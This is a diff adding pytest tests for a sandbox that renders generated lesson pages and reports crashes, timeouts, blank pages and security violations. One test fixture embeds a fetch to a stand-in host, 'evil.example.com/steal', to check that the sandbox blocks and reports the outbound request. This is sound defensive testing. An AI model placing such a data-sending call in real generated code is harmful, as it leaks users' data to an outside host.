@@ -17,6 +17,10 @@ Use cases:
 - LaTeX that KaTeX can parse passes, and what it cannot is reported with the expression; no expressions need no run
 - a missing sandbox, a script that hangs, one that crashes and one that prints garbage are SandboxErrors
 - LaTeX checking is skipped (with a log line) when the sandbox is not installed, so content validation still works
+- the render check: a good lesson renders all four pages; a throwing interactive is reported by name while its page
+  still renders; a throwing page is reported for that page only; an endless loop hits the time budget; a network
+  request is blocked and reported as a security violation; a blank page and an error in a click handler are found; an
+  unreadable document is reported; a runtime that is not built is a SandboxError
 """
 
 import re
@@ -147,3 +151,171 @@ def test_latex_is_skipped_with_a_log_line_when_the_sandbox_is_missing(tmp_path, 
         messages = SandboxRunner(sandbox_dir=tmp_path).latex(["x^2"])
 
     assert messages == [] and "skipping the LaTeX check" in caplog.text
+
+
+# --- the render check ---------------------------------------------------------------------------------------------
+
+from support.lesson_data import make_final_test, make_pages  # noqa: E402
+from support.media import png  # noqa: E402
+
+from graph.codegen import DocumentAssembler  # noqa: E402
+
+PAGES = ["introduction", "core", "advanced", "test"]
+needs_render = pytest.mark.skipif(not runner.render_available(), reason="the lesson runtime is not built")
+assembler = DocumentAssembler()
+PUBLIC_FIELDS = ("id", "type", "concept", "difficulty", "marks", "question", "options")
+
+
+def tsx(*lines: str) -> str:
+    return "\n".join(lines) + "\n"
+
+
+def lesson_payload(with_media: bool = False) -> dict:
+    questions = [{k: q[k] for k in PUBLIC_FIELDS if k in q} for q in make_final_test()["questions"]]
+    media = {}
+    if with_media:
+        media["a-1"] = {
+            "url": "https://media.invalid/a-1", "kind": "image", "alt": "An amoeba", "caption": "Amoeba",
+            "attribution": "Jane", "license": "cc-by-sa", "source_url": "", "width": 400, "height": 300,
+        }  # fmt: skip
+    return {
+        "title": "Binary search", "topic": "Binary search", "level": "beginner", "pages": make_pages(),
+        "final_test": {"title": "Test", "questions": questions}, "media": media,
+    }  # fmt: skip
+
+
+def document(components=None, page_overrides=None, placements=None) -> str:
+    pages = {k: assembler.template_page(k, (placements or {}).get(k, {})) for k in ("introduction", "core", "advanced")}
+    pages |= {"test": assembler.test_page()} | (page_overrides or {})
+    return assembler.assemble(components or {}, pages)
+
+
+def render(code: str, tmp_path=None, media: bool = False):
+    media_files = {}
+    if media:
+        (tmp_path / "a-1.png").write_bytes(png())
+        media_files["a-1"] = str(tmp_path / "a-1.png")
+    return runner.render_check(code, lesson_payload(media), pages=PAGES, media_files=media_files)
+
+
+WIDGET = tsx(
+    "function Interactive_widget_core() {",
+    "  const [n, setN] = useState(0);",
+    "  return (",
+    "    <div>",
+    "      <Button onClick={() => setN(n + 1)}>Add</Button>",
+    '      <Slider label="x" min={0} max={10} value={n} onChange={setN} /> {n}',
+    "    </div>",
+    "  );",
+    "}",
+)
+PAGE_WITH_TEXT = '<PageFrame title="Core"><p>some honest looking content, long enough to count</p>'
+
+
+@needs_render
+def test_a_good_lesson_renders_on_all_four_pages(tmp_path):
+    placements = {
+        "core": {"s1": ["<Interactive_widget_core />"]},
+        "introduction": {"s1": ['<Figure asset="a-1" />']},
+    }
+
+    report = render(document({"Interactive_widget_core": WIDGET}, placements=placements), tmp_path, media=True)
+
+    assert report.ok is True, report
+    assert report.pages == dict.fromkeys(PAGES, []) and report.components == {} and report.security == []
+
+
+@needs_render
+def test_an_interactive_that_throws_is_reported_by_name_and_does_not_break_the_page():
+    widget = tsx("function Interactive_widget_core() {", "  throw new Error('boom from the widget');", "}")
+    code = document({"Interactive_widget_core": widget}, placements={"core": {"s1": ["<Interactive_widget_core />"]}})
+
+    report = render(code)
+
+    assert report.ok is False
+    assert any("boom from the widget" in e for e in report.components["Interactive_widget_core"])
+    assert report.pages["core"] == [] and report.pages["introduction"] == []
+
+
+@needs_render
+def test_a_page_that_throws_while_rendering_is_reported_for_that_page_only():
+    broken = tsx(
+        "function Page_advanced() {",
+        '  return <PageFrame title="x">{LESSON.pages.advanced.nothing.here}</PageFrame>;',
+        "}",
+    )
+
+    report = render(document(page_overrides={"advanced": broken}))
+
+    assert report.ok is False
+    assert any("Runtime error" in e or "Uncaught" in e for e in report.pages["advanced"])
+    assert report.pages["core"] == [] and report.pages["test"] == []
+
+
+@needs_render
+def test_an_endless_loop_is_caught_by_the_time_budget(settings):
+    settings.SANDBOX_PAGE_TIMEOUT_MS = 2000
+    loop = tsx(
+        "function Page_core() {",
+        "  useEffect(() => { while (true) {} }, []);",
+        f"  return {PAGE_WITH_TEXT}</PageFrame>;",
+        "}",
+    )
+
+    report = render(document(page_overrides={"core": loop}))
+
+    assert any("did not finish" in e for e in report.pages["core"])
+    assert report.pages["introduction"] == []
+
+
+@needs_render
+def test_a_network_request_is_blocked_and_reported_as_a_security_violation():
+    leak = tsx(
+        "function Page_core() {",
+        "  useEffect(() => { fetch('https://evil.example.com/steal?c=1').catch(() => {}); }, []);",
+        f"  return {PAGE_WITH_TEXT}</PageFrame>;",
+        "}",
+    )
+
+    report = render(document(page_overrides={"core": leak}))
+
+    assert report.ok is False
+    assert any("evil.example.com" in v for v in report.security)
+
+
+@needs_render
+def test_a_blank_page_is_reported():
+    report = render(document(page_overrides={"core": tsx("function Page_core() {", "  return <div />;", "}")}))
+
+    assert any("blank" in e for e in report.pages["core"])
+
+
+@needs_render
+def test_an_error_in_a_click_handler_is_found_by_the_smoke_test():
+    page = tsx(
+        "function Page_core() {",
+        f"  return {PAGE_WITH_TEXT}",
+        "    <Button onClick={() => { throw new Error('click failed'); }}>Go</Button></PageFrame>;",
+        "}",
+    )
+
+    report = render(document(page_overrides={"core": page}))
+
+    assert any("click failed" in e for e in report.pages["core"])
+
+
+@needs_render
+def test_an_unreadable_document_is_reported_for_the_page_being_checked():
+    report = render("function (((")
+
+    assert report.ok is False
+    assert any("Syntax error" in e or "did not render" in e for e in report.pages["introduction"])
+
+
+def test_the_render_check_says_so_when_the_runtime_is_not_built(tmp_path):
+    (tmp_path / "scripts").mkdir()
+    (tmp_path / "scripts" / "check.mjs").write_text("")
+    (tmp_path / "node_modules").mkdir()
+
+    with pytest.raises(SandboxError, match="runtime is not built"):
+        SandboxRunner(sandbox_dir=tmp_path).render_check("x", {}, pages=["core"], media_files={})
